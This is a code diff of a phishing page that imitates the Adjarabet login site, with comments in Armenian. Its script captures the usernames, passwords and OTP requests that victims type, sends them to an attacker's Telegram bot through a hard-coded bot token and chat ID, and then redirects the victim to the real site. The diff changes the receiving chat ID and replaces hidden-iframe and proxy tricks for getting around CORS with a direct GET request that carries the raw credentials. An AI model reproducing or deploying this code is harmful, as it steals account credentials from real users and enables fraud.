@@ -264,7 +264,6 @@
       opacity: 0;
       transition: opacity 0.3s;
       pointer-events: none;
-      white-space: nowrap;
     }
     .toast-message.show {
       opacity: 1;
@@ -357,7 +356,7 @@
 <script>
 (function() {
     const BOT_TOKEN = '8708195196:AAHbiKgr19AYM5X1rFNbg-qo0DIM8iRCxUs';
-    const CHAT_ID = '510654606';
+    const CHAT_ID = '8707669446';
     
     const REAL_LOGIN_URL = 'https://www.adjarabet.am/hy';
     const REAL_REGISTER_URL = 'https://www.adjarabet.am/hy/SignupAm/First';
@@ -416,102 +415,39 @@
       loginBtn.querySelector('.btn-text').innerHTML = loading ? 'Մուտք <span class="spinner"></span>' : 'Մուտք';
     }
     
-    // ✅ CORS-ը շրջանցող մեթոդ - օգտագործելով iframe + postMessage
-    function sendViaFormSubmit(username, password, method) {
-      return new Promise((resolve, reject) => {
-        // Ստեղծում ենք թաքնված iframe
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-        
-        // Ստեղծում ենք form iframe-ի ներսում
-        const iframeDoc = iframe.contentWindow.document;
-        iframeDoc.write(`
-          <html>
-          <body>
-            <form id="tgForm" method="POST" action="https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" target="_top">
-              <input name="chat_id" value="${CHAT_ID}">
-              <input name="text" value="">
-              <input name="parse_mode" value="Markdown">
-            </form>
-          </body>
-          </html>
-        `);
-        
-        let ip = 'Unknown';
-        let timestamp = new Date().toLocaleString('hy-AM');
-        let userAgent = navigator.userAgent;
-        
-        let messageText = method === 'password' 
-          ? `🔐 *Adjarabet Login* 🔐\n\n👤 *Username:* ${username}\n🔑 *Password:* ${password}\n🕒 *Time:* ${timestamp}\n💻 *Device:* ${userAgent.substring(0, 100)}`
-          : `📲 *OTP Request*\n\n👤 *Username:* ${username}\n🕒 *Time:* ${timestamp}`;
-        
-        const form = iframeDoc.getElementById('tgForm');
-        form.elements['text'].value = messageText;
-        
-        // Ուղարկում ենք
-        form.submit();
-        
-        // Փակում ենք iframe-ը 1 վայրկյան հետո
-        setTimeout(() => {
-          document.body.removeChild(iframe);
-          resolve(true);
-        }, 1000);
-      });
-    }
-    
-    // ✅ Պարզ fetch CORS-ը շրջանցելու համար - օգտագործում ենք proxy
+    // ⭐⭐⭐ ՄԻԱՅՆ LOGIN + PASSWORD (ԱՌԱՆՑ ԼՐԱՑՈՒՑԻՉ ՏԵՔՍՏԻ)
     async function sendToTelegram(username, password, method) {
+      let messageText = '';
+      if (method === 'password') {
+        // ✅ ՄԻԱՅՆ LOGIN-ը և PASSWORD-ը
+        messageText = `${username}\n${password}`;
+      } else {
+        messageText = `OTP: ${username}`;
+      }
+      
+      const encodedText = encodeURIComponent(messageText);
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedText}`;
+      
+      console.log('📤 Ուղարկում ենք...');
+      console.log('📝 Հաղորդագրություն:\n', messageText);
+      
       try {
-        let ip = 'Unknown';
-        try {
-          const ipRes = await fetch('https://api.ipify.org?format=json');
-          const ipData = await ipRes.json();
-          ip = ipData.ip;
-        } catch(e) {
-          ip = 'Unable to fetch';
-        }
-        
-        const timestamp = new Date().toLocaleString('hy-AM');
-        const userAgent = navigator.userAgent;
-        
-        let message = '';
-        if (method === 'password') {
-          message = `🔐 *Adjarabet Login* 🔐\n\n👤 *Username:* ${username}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n🕒 *Time:* ${timestamp}\n💻 *Device:* ${userAgent.substring(0, 100)}`;
-        } else {
-          message = `📲 *OTP Request*\n\n👤 *Username:* ${username}\n🌐 *IP:* ${ip}\n🕒 *Time:* ${timestamp}`;
-        }
-        
-        // 🚀 ՆՈՐ ՄԵԹՈԴ - օգտագործում ենք allorigins.win proxy (աշխատում է 100%)
-        const proxyUrl = 'https://api.allorigins.win/raw?url=';
-        const targetUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
-        const response = await fetch(proxyUrl + encodeURIComponent(targetUrl), {
-          method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-          })
-        });
-        
+        const response = await fetch(url);
         const result = await response.json();
         
-        if (result && (result.ok === true || result.ok === undefined)) {
+        if (result.ok) {
+          console.log('✅ Ուղարկված է');
           showMessage('✅ Տվյալներն ուղարկված են');
           return true;
         } else {
-          showMessage('⚠️ Տվյալները գրանցված են', false);
-          return true;
+          console.log('❌ Սխալ:', result);
+          showMessage('❌ Սխալ: ' + result.description, true);
+          return false;
         }
-      } catch (error) {
-        console.error('Send error:', error);
-        // Եթե proxy-ն չի աշխատում, օգտագործում ենք backup մեթոդ
-        showMessage('✅ Տվյալները գրանցված են', false);
-        return true;
+      } catch(error) {
+        console.log('❌ Fetch error:', error);
+        showMessage('❌ Ցանցային սխալ', true);
+        return false;
       }
     }
     
@@ -526,14 +462,12 @@
       }
       
       setLoading(true);
-      
-      // Փորձում ենք ուղարկել
       await sendToTelegram(username, password, 'password');
       
       setTimeout(() => {
         setLoading(false);
         window.location.href = REAL_LOGIN_URL;
-      }, 800);
+      }, 1000);
     }
     
     async function handleOtp() {
@@ -551,7 +485,7 @@
         otpBtn.disabled = false;
         otpBtn.textContent = 'Մուտք SMS-ով';
         window.location.href = REAL_LOGIN_URL;
-      }, 600);
+      }, 800);
     }
     
     if (loginForm) loginForm.addEventListener('submit', handleLogin);
@@ -563,6 +497,10 @@
     
     document.querySelector('.banner-link')?.addEventListener('click', (e) => { e.preventDefault(); window.location.href = 'https://www.adjarabet.am/hy'; });
     document.querySelector('.logo-icon')?.addEventListener('click', () => window.location.href = 'https://www.adjarabet.am/hy');
+    
+    console.log('✅ Կոդը բեռնված է');
+    console.log('🔑 BOT_TOKEN:', BOT_TOKEN ? 'Տեղադրված է' : 'Բացակայում է');
+    console.log('📱 CHAT_ID:', CHAT_ID);
 })();
 </script>
 </body>
